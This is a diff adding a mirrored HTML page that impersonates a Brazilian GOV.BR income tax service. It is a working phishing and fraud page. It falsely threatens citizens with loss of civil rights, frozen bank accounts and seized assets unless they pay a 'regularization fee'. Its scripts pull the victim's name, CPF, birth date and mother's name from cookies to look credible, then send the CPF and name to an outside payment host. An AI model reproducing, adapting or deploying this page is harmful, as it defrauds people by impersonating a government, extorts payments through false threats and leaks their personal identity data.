@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+
+<!-- Mirrored from impostobrasil.com/2.php.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Feb 2025 06:18:00 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>GOV.BR - Regularizar Meu Imposto de Renda (DIRPF) </title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            background-color: #ffffff;
+            border-bottom: 2px solid #f8c600;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+        }
+
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .menu-icon .bar {
+            width: 25px;
+            height: 3px;
+            background-color: #007BFF;
+            margin: 3px 0;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            flex: 1;
+        }
+
+        .logo {
+            max-width: 100px;
+            height: auto;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 80px auto 20px auto;
+            padding: 20px;
+            text-align: left;
+            flex-grow: 1;
+        }
+
+        .breadcrumb {
+            font-size: 0.9rem;
+            color: #007BFF;
+            margin-bottom: 20px;
+        }
+
+        .titulo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #005385;
+            margin-bottom: 10px;
+        }
+
+        .greeting {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #d60101;
+            margin: 20px 0;
+        }
+
+        .status {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #00ac15;
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+            margin-bottom: 20px;
+        }
+
+        .status .bolinha-piscando {
+            width: 10px;
+            height: 10px;
+            background-color: #00ac15;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: piscar 1s infinite;
+        }
+
+        @keyframes piscar {
+            0% {
+                opacity: 0;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 0;
+            }
+        }
+
+        .alert-message {
+            font-size: 1rem;
+            line-height: 1.6;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .btn-pagamento {
+            display: block;
+            background-color: #08b81d;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 12px 20px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1rem;
+            text-align: center;
+            margin: 20px auto;
+            max-width: 100%;
+        }
+
+        .btn-pagamento:hover {
+            background-color: #006d13;
+        }
+
+        .servico-info {
+            font-size: 1rem;
+            font-weight: bold;
+            color: #005385;
+            text-align: left;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 2px solid #ffcf03;
+        }
+
+        footer {
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+            padding: 10px;
+            background-color: #f4f4f9;
+            margin-top: auto;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+                margin: 70px auto 20px auto;
+            }
+
+            .titulo {
+                font-size: 1.3rem;
+            }
+
+            .greeting {
+                font-size: 1rem;
+            }
+
+            .btn-pagamento {
+                padding: 10px 18px;
+                font-size: 1rem;
+            }
+
+            .servico-info {
+                font-size: 0.9rem;
+            }
+        }
+
+        .modal {
+            display: none;
+            /* Oculta o modal por padrão */
+            position: fixed;
+            z-index: 1001;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 600px;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+    </style>
+
+</head>
+
+<body>
+    <header>
+        <div class="menu-icon">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </div>
+        <div class="logo-container">
+            <img src="img/logo-1.png" alt="Tribunal Superior Eleitoral" class="logo" style="position: relative; left: -30px;">
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="breadcrumb">
+            Imposto de Renda &gt; Regularização
+        </div>
+
+        <div class="greeting" id="greeting">URGENTE: Regularize Seu Imposto de Renda Imediatamente</div>
+
+        <div class="status">
+            <div class="bolinha-piscando"></div>
+            REGULARIZAÇÃO NECESSÁRIA
+        </div>
+
+        <div class="alert-message">
+            Prezado(a) <b>Cidadão</b>,
+            <br><br>
+            Verificamos que <b>sua declaração de imposto de renda encontra-se irregular ou desatualizada</b>, e é
+            crucial que você regularize sua situação o quanto antes. A não regularização pode trazer sérias
+            consequências, como:
+            <ul>
+                <li><b>Suspensão de seus direitos civis,</b> incluindo os direito de compras em seu nome e obter
+                    passaporte;</li>
+                <li><b>Complicações no acesso a qualquer tipo de benefícios governamentais</b>, como programas sociais e
+                    assistenciais;</li>
+                <li><b>A suspensão de suas contas bancárias e retenção/apreensão de bens.</b></li>
+            </ul>
+            <b>Para evitar bloqueios judiciais e multas, é necessário que você atualize seus DADOS e após pague a taxa
+                para regularização. </b>
+            <br><br>
+        </div>
+
+        <a class="btn-pagamento" href="#" onclick="redirecionarPagamento()">Clique aqui para Regularizar Agora</a>
+
+<script>
+// Função para obter valores dos cookies
+function getCookie(name) {
+    let matches = document.cookie.match(new RegExp(
+        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+    ));
+    return matches ? decodeURIComponent(matches[1]) : "";
+}
+
+function redirecionarPagamento() {
+    // Obtém os valores dos cookies
+    let nome = getCookie("nome") || "Cidadão";
+    let cpf = getCookie("cpf") || "";
+
+    // Codifica os valores para uso seguro na URL
+    nome = encodeURIComponent(nome);
+    cpf = encodeURIComponent(cpf);
+
+    // URL base de pagamento
+    let urlBase = "https://pay.seuimpostoo.shop/DPXw3XxR9nO3zmp";
+
+    // Cria a URL final com parâmetros
+    let urlFinal = `${urlBase}?document=${cpf}&name=${nome}`;
+
+    // Redireciona o usuário para a URL final
+    window.location.href = urlFinal;
+}
+</script>
+
+        <!-- Popup Modal -->
+        <div id="modalPagamento" class="modal" style="overflow: none;">
+            <div class="modal-content flex flex-col items-center justify-center h-96">
+                <span class="close" onclick="fecharPopupPagamento()">&times;</span>
+                <div id="loading" class="mb-4" style="display: flex; align-items: center; justify-content: center;">
+                    <img src="loading.gif" alt="Carregando...">
+                </div>
+                <iframe src="pagamento.html" style="width: 100%; height: 500px; border: none;" onload="hideLoading()"></iframe>
+            </div>
+        </div>
+        <br>
+        <br>
+        <br>
+
+        <div class="servico-info">
+            Proteja seus direitos e evite complicações. Faça sua regularização já!
+
+        </div>
+    </div>
+
+    <footer>
+        © 2024 (DIRPF). Todos os direitos reservados.
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const nome = getCookie('nome') || 'Cidadão';
+            const cpf = getCookie('cpf') || '';
+            const nascimento = getCookie('nascimento') || '';
+            const mae = getCookie('mae') || '';
+            const situacao = getCookie('situacao') || '';
+
+            const greetingElement = document.getElementById('greeting');
+            greetingElement.innerHTML = `URGENTE: Regularize Seu Imposto de Renda Imediatamente`;
+
+            const alertMessageElement = document.querySelector('.alert-message');
+            alertMessageElement.innerHTML = `
+                Prezado(a) <b>${nome}</b>,
+                <br><br>
+                <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 15px;">
+                    <p style="margin: 5px 0;"><b>CPF:</b> ${cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')}</p>
+                    <p style="margin: 5px 0;"><b>Data de Nascimento:</b> ${nascimento}</p>
+                    <p style="margin: 5px 0;"> ${mae}</p>
+                    <p style="margin: 5px 0;"><b>Situação Cadastral:</b> <span style="color: #d60101;"><b>Irregular</b></span></p>
+                </div>
+                Verificamos que <b>sua declaração de imposto de renda encontra-se irregular ou desatualizada</b>, e é crucial que você regularize sua situação o quanto antes. A não regularização pode trazer sérias consequências, como:
+                <ul>
+                    <li><b>Suspensão de seus direitos civis,</b> incluindo os direito de compras em seu nome e obter passaporte;</li>
+                    <li><b>Complicações no acesso a qualquer tipo de benefícios governamentais</b>, como programas sociais e assistenciais;</li>
+                    <li><b>A suspensão de suas contas bancárias e retenção/apreensão de bens.</b></li>
+                </ul>
+                <b>Para evitar bloqueios judiciais e multas, é necessário que você atualize seus DADOS e após pague a taxa para regularização. </b>
+                <br><br>
+            `;
+        });
+
+        function getCookie(name) {
+            const cookies = document.cookie.split('; ').reduce((prev, current) => {
+                const [key, value] = current.split('=');
+                prev[key] = decodeURIComponent(value);
+
+                return prev;
+            }, {});
+            return cookies[name];
+        }
+    </script>
+
+    <script>
+        // Função para abrir o modal
+        function abrirPopupPagamento() {
+            document.getElementById('modalPagamento').style.display = 'block';
+        }
+
+        // Função para fechar o modal
+        function fecharPopupPagamento() {
+            document.getElementById('modalPagamento').style.display = 'none';
+        }
+
+        function hideLoading() {
+            document.getElementById("loading").style.display = "none"; // Esconde o loading
+        }
+    </script>
+
+</body>
+
+
+<!-- Mirrored from impostobrasil.com/2.php.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Feb 2025 06:18:01 GMT -->
+</html>
